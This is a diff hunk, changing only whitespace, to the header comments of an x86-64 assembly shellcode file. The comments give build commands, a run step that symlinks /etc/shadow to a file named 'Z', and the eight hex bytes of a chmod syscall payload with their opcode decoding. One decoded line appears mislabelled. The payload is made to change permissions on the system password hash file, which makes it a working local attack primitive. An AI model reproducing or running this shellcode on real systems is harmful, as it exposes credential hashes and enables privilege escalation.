@@ -1,11 +1,11 @@
 # Compile With: gcc -nostdlib -static -o chmod chmod.S or as -o chmod.o chmod.S ; ld -o chmod chmod.o
 # Run With: ln -s /etc/shadow Z ; ./chmod
 # Hex Version: "\x5e\x6a\x5a\x54\x5f\x58\x0f\x05"
-#	\x5e	-> popq %rsi
+#	\x5e	 -> popq %rsi
 # 	\x6a\x5a -> pushq $0x5a
-#	\x54	-> pushq %rsp
-#	\x5f	-> popq %rsi
-#	\x58	-> popq %rax
+#	\x54	 -> pushq %rsp
+#	\x5f	 -> popq %rsi
+#	\x58	 -> popq %rax
 #	\x0f\x05 -> syscall
 #
 
